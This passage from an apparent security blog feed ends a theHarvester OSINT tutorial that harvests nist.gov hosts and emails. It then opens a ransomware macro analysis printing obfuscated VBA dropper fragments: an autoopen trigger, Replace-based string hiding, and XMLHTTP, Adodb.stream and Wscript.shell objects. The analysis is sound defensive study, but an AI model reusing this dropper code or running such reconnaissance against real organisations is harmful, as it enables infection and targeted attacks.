&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/theharvester/theharvester_start2.png&quot;&gt;&lt;img src=&quot;/images/theharvester/theharvester_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another possibility is launching it by simply opening the Terminal and typing &lt;code class=&quot;highlighter-rouge&quot;&gt;theharvester&lt;/code&gt;. In any case, we are prompted with the tool banner, version, author informations and usage instructions:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/theharvester/theharvester_intro.png&quot;&gt;&lt;img src=&quot;/images/theharvester/theharvester_intro.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The instructions are pretty clear: we have a series of parameters to set as arguments through which we can customize the search. For each of them there is a description of what they do; the most importants are “-d” and “-b” which are mandatory and determine respectively the &lt;em&gt;target domain&lt;/em&gt; about which we want to gather informations and the &lt;em&gt;data sources&lt;/em&gt; we want to use to find them (the list of the sources that can be set is reported in the description).&lt;br /&gt;
Some data sources require an API key to work: while the acquisition of some of them is free, like the Bing one, other require the payment of a fee, like the Shodan one.&lt;/p&gt;

&lt;p&gt;We will see now an example of information gathering activity performed on the National Institute of Standards and Technology (NIST) domain.&lt;br /&gt;
Since Google is one of the mentioned data sources we can use for the search, we can start with a simple request by asking all hosts and emails that Google Search Engine can find in the first 100 results for the domain “nist.gov” (email addresses written here are fictional for privacy reasons):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# theharvester -d nist.gov -b google -l 100
......................................................
[-] Searching in Google:
	Searching 0 results...
	Searching 100 results...


[+] Emails found:
------------------
bugsbunny@nist.gov
daffyduck@nist.gov
foghornleghorn@nist.gov

[+] Hosts found in search engines:
------------------------------------
[-] Resolving hostnames IPs... 
52.71.87.193:acvp.nist.gov
132.163.4.217:csrc.nist.gov
132.163.4.217:face.nist.gov
129.6.89.132:inside.nist.gov
132.163.4.217:itl.nist.gov
129.6.13.177:nvd.nist.gov
129.6.13.111:nvlpubs.nist.gov
52.71.217.42:pages.nist.gov
24.56.178.140:time.nist.gov
129.6.13.178:web.nvd.nist.gov
129.6.24.30:webbook.nist.gov
132.163.4.18:www.glb.nist.gov
132.163.4.18:www.nist.gov
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As reported above, the tool has quickly found emails, hostnames and has also resolved IP addresses.&lt;/p&gt;

&lt;p&gt;Another interesting feature is the capability to check for virtual hosts: through DNS resolution, the tool verifies if a certain IP address is associated with multiple hostnames. This is a really important information because the Security for a given host on that IP depends not only on its Security level, but also from how securely are configured the others hosted on that same IP. In fact, if an attacker comprimises one of them and gains access to the underlying server, then he can easily reach every other virtual host.&lt;br /&gt;
To launch a virtual host search we just need to add “-v”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# theharvester -d nist.gov -b google -l 100 -v
.........................................................
[+] Virtual hosts:
==================
132.163.4.217:csrc.nist.gov
132.163.4.217:trecvid.nist.gov
132.163.4.217:www.atp.nist.gov
132.163.4.217:www.itl.nist.gov
132.163.4.217:fire.nist.gov
132.163.4.217:www.iapws.org
132.163.4.217:www.boulder.nist.gov
132.163.4.217:itl.nist.gov
132.163.4.217:trec.nist.gov
132.163.4.217:duc.nist.gov
132.163.4.217:www.baldrige.nist.gov
132.163.4.217:zing.ncsl.nist.gov
132.163.4.217:biometrics.nist.gov
132.163.4.217:baldrige.nist.gov
132.163.4.217:ovrt.nist.gov
132.163.4.217:cryogenics.nist.gov
132.163.4.217:www.cryogenics.nist.gov
132.163.4.217:www-nlpir.nist.gov
132.163.4.217:ieee1451.nist.gov
132.163.4.217:w3.antd.nist.gov
132.163.4.217:tides.nist.gov
132.163.4.217:blea.doc.gov
132.163.4.217:motion.aptd.nist.gov
132.163.4.217:www.antd.nist.gov
132.163.4.217:iapws.org
129.6.13.111:nvlpubs.nist
129.6.13.111:gsi.nist
129.6.13.111:museum.nist
129.6.13.111:nvlpubs.nist.gov
129.6.13.111:gsi.nist.gov
129.6.13.111:museum.nist.gov
129.6.13.111:srdata.nist.gov
129.6.24.30:webbook.nist.gov
132.163.4.162:www.nist.gov
132.163.4.162:www.itl.nist.gov
132.163.4.162:tf.nist.gov
132.163.4.162:cnst.nist.gov
132.163.4.162:www.baldrige
132.163.4.162:fire.nist.gov
132.163.4.162:www.bldrdoc.gov
132.163.4.162:nvl.nist.gov
132.163.4.162:www.glb.nist.gov
132.163.4.162:gsi.nist.gov
132.163.4.162:math.nist.gov
132.163.4.162:ieee1451.nist.gov
132.163.4.162:www.tf.nist.gov
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;theHarvester is also able to acquire names of persons related to the target domain by crawling social networks such as LinkedIn; this can be done by simply using as data source the argument “linkedin” (fictional names are reported here for privacy reasons):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# theharvester -d nist.gov -b linkedin
.................................................
[-] Searching in Linkedin..
	Searching 100 results..
Users from Linkedin:
====================
Bugs Bunny
Daffy Duck
Foghorn Leghorn
.................................................
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once you have emails and names you can try to associate them to find a correspondence.&lt;/p&gt;

&lt;p&gt;It is ok to have results printed on the terminal standard output, but when we are dealing with a big amount of data it is nice to report them in a file for later use. theHarvester offers the opportunity to save results on both XML and HTML formats by specifying file name with “-f” option.&lt;br /&gt;
Before launching the command, it is always a good practice to create a folder where we can store gathered data about the target:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# mkdir NIST
root@kali:~# cd NIST
root@kali:~/NIST#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Then we can start the search and this time we use “-b all” which harvest informations using Google, PGP key server, Bing and Exalead:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/NIST# theharvester -d nist.gov -b all -l 100 -v -f results.html
........................................................................
[+] Saving files...
Files saved!
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;If the files are correctly saved we get the “Files saved!” message and we find them inside our current folder:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/NIST# ls
results.xml  results.html 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Finally we can open the HTML file with our favourite web browser:
&lt;a href=&quot;/images/theharvester/theharvester_report.png&quot;&gt;&lt;img src=&quot;/images/theharvester/theharvester_report.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As shown in the above image, we get a nice graph reporting the percentage of gathered data for each category part of our search: emails, hosts and virtual hosts. After that we just get a list of all the elements for each category (only a few lines are displayed here).&lt;/p&gt;

&lt;p&gt;Even if these are the parameters I use the most, feel free to play with the others.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;theHarvester is a valuable tool for OSINT which allows to quickly discover a good amount of data, especially email addresses. Remember that you need to verify informations: for example, it could be that an employer is not working anymore on a certain company, but his email address is still present on the web and so it will be returned in the results.&lt;br /&gt;
Automatic tools are useful, but still their outputs need to be correctly managed and interpreted.&lt;/p&gt;
</description>
        <pubDate>Mon, 22 Aug 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/08/22/open-source-intelligence-with-theharvester.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/08/22/open-source-intelligence-with-theharvester.html</guid>
        
        <category>Information gathering</category>
        
        <category>OSINT</category>
        
        <category>theHarvester</category>
        
        
      </item>
    
      <item>
        <title>Macro Malware Analysis</title>
        <description>&lt;p&gt;Malware, in general, is any kind of malicious program which executes on a machine; it can be used for a large variety of purposes such as influence computer behavior, display ads, steal personal informations, take control of remote machines and so on.&lt;br /&gt;
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Ransomware&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Lately a particular category of malware, called ransomware, is spreading aggressively especially through email compaigns.
This kind of malicious program infects computers by encrypting files and asking for a ransom payment to recover them; attackers send emails to an extensive number of recepients (mass email attack) in order to infect as much machines as possible.&lt;br /&gt;
They tend to use Social Engineering techniques by writing an attractive email subject and text so as to trick users into opening an attachment or a link.&lt;br /&gt;
Once the victim opens the downloaded file (which can have different extensions, like “.exe”, “.doc”, “.xls”, “.js”, “.cab”), malware executes and infects the machine by encrypting data with RSA-2048 and AES-128 algorithm. Then, the user gets prompted with a screen asking for money in order to receive the key to restore encrypted data.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/macro_malware/ransomware.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recently, I got my hands on a ransomware variant which exploits Microsoft Office Macro to execute evil code. Of course, this one was attached in an email as a document with “.docm” extension which is the one used for Word documents with macros.&lt;br /&gt;
Macros are essentially scripts written in VBA (Visual Basic for Applications), a language used inside Office documents for automating frequent tasks and activities. Since they can interact with the system, attackers can use them as a starting point for the attack.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Macro code deobfuscation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Since we are working with Object Linking and Embedding (OLE), which is a Microsoft proprietary technology for compound documents (like the “.docm” we are threating), one possible way to start analyzing this kind of file is using a very nice utility called &lt;em&gt;oledump&lt;/em&gt;: &lt;a href=&quot;https://blog.didierstevens.com/programs/oledump-py&quot;&gt;https://blog.didierstevens.com/programs/oledump-py&lt;/a&gt;.&lt;br /&gt;
This tool allows to extract macro code so we can take a look at the source; we can launch the program and insert as input argument our “.docm” file which I have renamed “malware.docm”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/oledump_V0_0_25# ./oledump.py malware.docm 
A: word/vbaProject.bin
 A1:       419 &#39;PROJECT&#39;
 A2:        65 &#39;PROJECTwm&#39;
 A3: M   23316 &#39;VBA/Module1&#39;
 A4: M    1347 &#39;VBA/ThisDocument&#39;
 A5:      4445 &#39;VBA/_VBA_PROJECT&#39;
 A6:      1204 &#39;VBA/__SRP_0&#39;
 A7:       106 &#39;VBA/__SRP_1&#39;
 A8:       292 &#39;VBA/__SRP_2&#39;
 A9:       103 &#39;VBA/__SRP_3&#39;
A10:       572 &#39;VBA/dir&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Oledump returns a list of items describing document structure; we are interested in macro code, i.e. items A3 and A4, where tag M indicates the presence of macros. Once we have identified that the interesting portions are “Module1” (looking at the reported dimensions, this should be the core of the script) and “ThisDocument”, we can extract them with the following commands:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/oledump_V0_0_25# ./oledump.py malware.docm -v -s A3 &amp;gt; Module1
root@kali:~/oledump_V0_0_25# ./oledump.py malware.docm -v -s A4 &amp;gt; ThisDocument
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We can start by taking a look at “ThisDocument”:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ThisDocument&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1Normal.ThisDocument&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_GlobalNameSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;False&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Creatable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;False&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_PredeclaredId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Exposed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_TemplateDerived&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Customizable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Sub&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;autoopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SAAKASHVILLI_MUDEN&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Rastyag&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Sub&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Immediately, there is something that catches the attention: in the last three lines there is the &lt;em&gt;autoopen()&lt;/em&gt; function, which is used for launching macro execution at the opening of the file; this is a first sign of malware activity.&lt;br /&gt;
Since there is nothing else here, we can continue the analysis by checking “Module1”. This file is pretty big, but it contains a lot of junk code and uses encryption; this is done for two main reasons: one is to decrease the chances of detection by Antivirus softwares and the other one is to increase difficulty, for a security analyst, of blocking the attack as fast as possible.&lt;br /&gt;
The code starts with some variables definitions and here I have reported only the useful ones:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Module1&quot;&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Object&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKCwwed&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Object&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighKSKLAL&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Object&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighLAKOPPC&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighGMAKO&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Object&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh4&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighASALLLP&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Variant&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The attacker alternates junk code taken from the web with his malicious code hidden inside, but with a little work we can find what we are interested in.&lt;/p&gt;

&lt;p&gt;Scrolling down the code, there are three portions suggesting there is a basic encryption technique which uses the &lt;em&gt;Replace()&lt;/em&gt; function that has been renamed in &lt;em&gt;GodnTeBabenParama()&lt;/em&gt;:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A3&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Function&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BRREADicroBRRREADoft.XBRREADLHTTPBRRRREADAdodb.BRRREADtrBREADaBRREADBRRRREADBRRREADhBREADll.Appli&quot;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cationBRRRREADWBRRREADcript.BRRREADhBREADllBRRRREADProcBREADBRRREADBRRREADBRRRREADGBREADTBRRRREADTBREADBRREADPBRRRREADTypBREADBRRRREADopBREADnBRRRREADwritTRONponBRRREADBREADBodyBRRRREADBRRREADavBREADtofilBREADBRRRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;TRON&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BREADBRRRREADrBREADBRRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\zorginBRRREAD.BREADxBREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;M&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BRRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Lastly, these values are put inside an array by using &lt;em&gt;Split()&lt;/em&gt; function:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BRRRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The result of these substitutions gives a lot of informations since the elements of the array are used in important parts of the code:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XMLHTTP&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Adodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;streaM&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Application&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Wscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GeT&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TeMP&lt;/span&gt;
